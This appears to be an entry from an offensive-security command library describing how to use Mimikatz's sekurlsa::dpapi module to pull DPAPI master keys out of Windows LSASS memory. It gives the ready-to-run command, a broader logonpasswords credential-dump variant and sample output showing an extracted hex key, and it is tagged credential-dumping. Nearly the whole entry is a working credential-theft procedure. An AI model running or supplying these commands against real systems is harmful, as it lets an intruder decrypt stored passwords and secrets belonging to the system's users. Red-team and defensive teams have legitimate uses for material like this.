---
id: 5323f7c3-e15e-42d6-aa03-17e99f16da93
name: mimikatz-sekurlsa-dpapi-retrieve-masterkey
type: command
executor: cmd
data: 'mimikatz.exe "sekurlsa::dpapi" exit'
output: null
created_at: '2023-04-06T03:56:26.276380+00:00'
updated_at: '2023-04-10T20:37:13.305156+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - lsass
verified: true
validated: true
---

# mimikatz-sekurlsa-dpapi-retrieve-masterkey

## Command

```cmd
mimikatz.exe "sekurlsa::dpapi" exit
```

## Description

Uses Mimikatz to extract DPAPI master keys from the LSASS process memory, providing the hex keys needed to decrypt protected credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sekurlsa::dpapi | Dump DPAPI keys from LSASS | Built-in |

## Examples

### Basic Usage

```cmd
mimikatz.exe "sekurlsa::dpapi" exit
```

### Advanced Usage

```cmd
mimikatz.exe "sekurlsa::logonpasswords" "exit"  # For broader credential dump including DPAPI
```

## Expected Output

```
Key GUID          : {d9c2c6d2-...}
Key               : 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```

## Related

- [[procedures/Credential-Theft-with-Mimikatz-and-DPAPI]]
- [[tools/Mimikatz]]
